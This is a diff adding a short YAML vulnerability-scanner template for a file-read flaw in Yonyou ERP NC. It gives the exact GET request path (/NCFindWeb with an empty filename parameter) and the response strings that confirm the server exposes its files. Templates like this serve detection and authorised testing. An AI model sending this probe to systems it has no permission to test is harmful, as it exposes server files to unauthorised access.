@@ -1,0 +1,9 @@
+name: poc-yaml-yonyou-erp-nc-readfile
+rules:
+  - method: GET
+    path: /NCFindWeb?service=IPreAlertConfigService&filename=
+    expression: response.status == 200 && response.body.bcontains(b"InstallProperties_zh.properties") && response.body.bcontains(b"testperformance.jsp") && response.body.bcontains(b"ncwslogin.jsp")
+detail:
+  author: jingling(https://github.com/shmilylty)
+  links:
+    - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
